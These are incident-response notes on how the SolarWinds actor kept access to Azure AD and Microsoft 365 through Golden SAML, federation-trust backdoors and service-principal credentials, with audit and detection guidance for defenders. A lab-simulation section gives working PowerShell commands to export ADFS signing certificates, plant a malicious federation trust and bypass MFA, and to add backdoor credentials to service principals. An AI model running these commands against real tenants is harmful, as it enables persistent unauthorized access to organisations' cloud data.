# Azure AD Incident Response

Rough notes for understanding the techniques used by the Solarwinds actor used to facilitate long-term access to Microsoft environments. These techniques allowed the attacker to establish difficult-to-detect and remove persistence mechanisms.

Four techniques: 

__On-premise__
* **Stealing ADFS token-signing certificates to move laterally to cloud environments and facilitate long-term access** - Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens - "Golden SAML" attack. Allow anyone with the certificate to impersonate any user to your cloud environment. 
* **Modifying privileged users to cloud services (including their credentials) through account synchronization** - Setting passwords for accounts in privileged cloud groups. Adding accounts to privileged cloud groups. 

__Cloud__
* **Creating or modifying federation trusts to facilitate long-term access to cloud services** - adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens. These can either be configured in Azure AD with PowerShell management APIs, or configured on an ADFS server and synced with Azure AD. Allow anyone with the malicious addded certificate to impersonate any user to your cloud environment. 
* **Creating or modifying service principals to provide long-term API-based access to cloud services** - adding credentials to existing service principals, adding new service principals with credentials, adding permissions to service principals and applications to access Microsoft Graph API. Allow anyone with the credential to access data via APIs from your cloud services. 

__Third-party__
* **Stealing the certificates used for service principals to provide long-term API-based access to cloud services** -- stealing certificates used to authenticate with service principals (see the attack against Mimecast)

Example of how these techniques are used in practice: 

Microsoft [four stages of an attack](https://us-cert.cisa.gov/ncas/alerts/aa21-008a) to go from priviliged on premises access to persistent access to data from cloud services. 
* **Stage 1: Forging a trusted authentication token used to access resources that trust the on-premises identity provider** 
  * Detection Method 1: Correlating service provider login events with corresponding authentication events in Active Directory Federation Services (ADFS) and Domain Controllers
  * Detection Method 2: Identifying certificate export events in ADFS
  * Detection Method 3: Customizing SAML response to identify irregular access
  * Detection Method 4: Detecting malicious ADFS trust modification
* **Stage 2: Using the forged authentication token to create configuration changes in the Azure AD (establishing a foothold)**
* **Stage 3: Acquiring an OAuth access token for the application using the forged credentials added to an existing application or service principal and calling APIs with the permissions assigned to that application**
* **Stage 4: Once access has been established, the threat actor Uses Microsoft Graph API to conduct action on objectives from an external RESTful API (queries impersonating existing applications)**

- [Azure AD Incident Response](#azure-ad-incident-response)
  * [Notes for simulating attacks in a lab](#notes-for-simulating-attacks-in-a-lab)
    + [Exporting an ADFS certificate](#exporting-an-adfs-certificate)
    + [Modifying an existing federation trust](#modifying-an-existing-federation-trust)
    + [Adding a malicious federation trust](#adding-a-malicious-federation-trust)
    + [Adding credentials to a service principle](#adding-credentials-to-a-service-principle)
      - [Certificate](#certificate)
      - [Password](#password)
    + [Creating a new service principle](#creating-a-new-service-principle)
  * [Auditing for backdoors](#auditing-for-backdoors)
    + [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
    + [Commands to manually audit service principals](#commands-to-manually-audit-service-principals)
      - [Review service principals with credentials](#review-service-principals-with-credentials)
      - [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
  * [Detecting for the use of attacks](#detecting-for-the-use-of-attacks)
    + [Use of token-signing certificates to spoof SAML tokens](#Use-of-token-signing-certificates-to-spoof-SAML-tokens)
    + [Investigate suspect service principals](#investigate-suspect-service-principals)
    + [Azure Sentinel data sources to configure](#azure-sentinel-data-sources-to-configure)
    + [Other useful commands](#other-useful-commands)
  * [Further references](#further-references)


Background reading on defending against the threat: 
* [Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://us-cert.cisa.gov/ncas/alerts/aa21-008a)
* [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft blog on Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Microsoft blog on Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)

## Notes for simulating attacks in a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the applicaiton. 

### Exporting an ADFS certificate

PS> Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  

Export the ADFS configuration for more information: 

PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  

You can also use ADFSDump https://github.com/fireeye/ADFSDump

### Modifying an existing federation trust


PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  

AuditLogs | where OperationName =~ "Set federation settings on domain"

### Adding a malicious federation trust

PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  

Creates the Azure AD audit log event "Set domain authentication"

### Adding credentials to a service principle 

#### Certificate 

PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  

Creates the Azure AD audit log event "Add service principal credentials"
#### Password

PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  

Creates the Azure AD audit log event "Add service principal credentials"

### Creating a new service principle 

PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  

## Auditing for backdoors 

PS> Install-module AzureADPreview -AllowClobber
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement  
PS> Connect-ExchangeOnline  

PS> Install-module MSOnline  
PS> Connect-MsolService  

PS> Install-Module AZ
PS> Connect-AzAccount

PS> # CISA's Sparrow  
PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing   
PS> .\Sparrow.ps1  

PS> # CrowdStrike's Azure Reporting Tool (CRT)  
PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/raw/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1  

PS> # AzureHound  
PS> Invoke-WebRequest 'https://raw.githubusercontent.com/BloodHoundAD/AzureHound/master/AzureHound.ps1' -OutFile 'AzureHound.ps1' -UseBasicParsing  
PS> . .\AzureHound.ps1  
PS> Invoke-AzureHound  

PS> # Hawk
PS> Install-module hawk
PS> start-hawktenantinvestigation  

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** (unclear if these can be changed, Exchange Online PowerShell APIs to configure these state they only work for on-prem Exchange)

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually audit service principals

* CISA Sparrow script provides the best data for this
* Audit the creation and use of credentials for service principal. 
* Review the permissions assigned to service principles. 
* Audit the assignment of credentials to applications that allow non-interactive sign-in by the application and permissions for the Microsoft Graph API.
* Look for unusual application usage, such as use of dormant applications.

#### Review service principals with credentials 

PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   

#### Review service principals with credentials and risky permissions 

See scripts output in Sparrow and CRT tool.  

PS> # Get Service Principal using objectId  
PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    

PS> # Get Azure AD App role assignments using objectID of the Service Principal (users)  
PS> $assignments = Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId -All $true   

PS> # Get all delegated permissions for the service principal  
PS> $spOAuth2PermissionsGrants = Get-AzureADOAuth2PermissionGrant -All $true| Where-Object {$\_.clientId -eq $sp.ObjectId} | Format-List  

PS> # Get all application permissions for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object { $\_.PrincipalType -eq "ServicePrincipal" }

PS> # Get all application permissions to Microsoft Graph for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    

PS> # Look up Microsoft Graph permissions    
PS> $GraphSP = Get-AzureADServicePrincipal -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    
PS> $GraphAppRoles = $GraphSP.AppRoles | Select-Object -Property AllowedMemberTypes, Id, Value    
PS> $GraphAppRoles| Where-Object {$\_.Id -eq "e2a3a72e-5f79-4c64-b1b1-878b674786c9" -or $\_.Id -eq "810c84a8-4a9e-49e6-bf7d-12d183f40d01"}    

App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

Mimecast: Mimecast ask organisations to add an application/service principal to Azure AD and add a certificate to that service principal, allowing Mimecast to authenticate to it. They then ask organisations to assign that service principal the permissions __full_access_as_app__ to __Office 365 Exchange Online__. See: https://community.mimecast.com/s/article/Creating-an-Office-365-Association-for-Server-Connections-1061681132

## Detecting for the use of attacks 

### Use of token-signing certificates to spoof SAML tokens

Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20

### Investigate suspect service principals

** AADServicePrincipalSignInLogs **  
* In preview for Azure AD. Requires additional configuration to be sent to Sentinel (on the Azure AD “Diagnostic Setting” page).   

** MailItemsAccessed  **
* For customers with G5 or E5 licensing levels, the MailItemsAccessed log should show applications accessing users’ mailboxes. This log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription.  
* The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.

### Azure Sentinel data sources to configure

* AzureActiveDirectory (if not already onboarded to Azure Sentinel retained for 30 days in Azure Azure Active Directory)
  * Azure AD Audit Logs
  * Azure AD Sign-In Logs
  * Azure AD Managed Identity Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Non-Interactive User Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Service Principal Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Provisioning Logs (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Risky Sign-In events (Needs to be configured in Azure AD diagnostic settings)
* SecurityEvents - with process creation auditing configured on tier 0 systems (if Defender is not deployed and DeviceProcessEvents can be used)
* Office365 - OfficeActivity (Exchange Online, OneDrive, Teams) (if not already onboarded to Sentinel retained for 90 days E3 / 1 year E5 in the Unified Audit Logs. These have to be manually enabled by the organisation.)
* Microsoft 365 Defender - includes MDATP raw data
* Microsoft Defender for Endpoint
* AzureMonitor(IIS)

### Other useful commands

PS> Get-AADIntLoginInformation -Domain domain.com  
PS> Get-AzureADTenantDetail | Select *  

## Further references

[Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/)
* There is a good list in here of what to search for in Azure AD that goes further than the above including:
  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
  * Reviewing Azure B2B external identities’ access to the Azure portal 
  * Review environment for overly privileged service accounts that may have access to Azure

[Microsoft blog explaining the difference between service principals and applicaitons](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)

[Microsoft video on modern authentication methods including ADFS and SAML](https://twitter.com/SwiftOnSecurity/status/1217942428243632128?s=20) 

[FireEye blog on carrying out attacks](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)

https://www.youtube.com/watch?v=fpUZJxFK72k  

https://dirkjanm.io/talks/  

https://www.youtube.com/watch?v=SG2ibjuzRJM  

https://www.youtube.com/watch?v=JEIR5oGCwdg  

https://www.youtube.com/watch?v=LufXEPTlPak  

https://vimeo.com/214855977  

https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/  

https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html

https://www.youtube.com/watch?v=tJkjOnxcw6w

https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf

https://insen.github.io/blog/2017/09/24/Azure-AAD-with-Office-365/

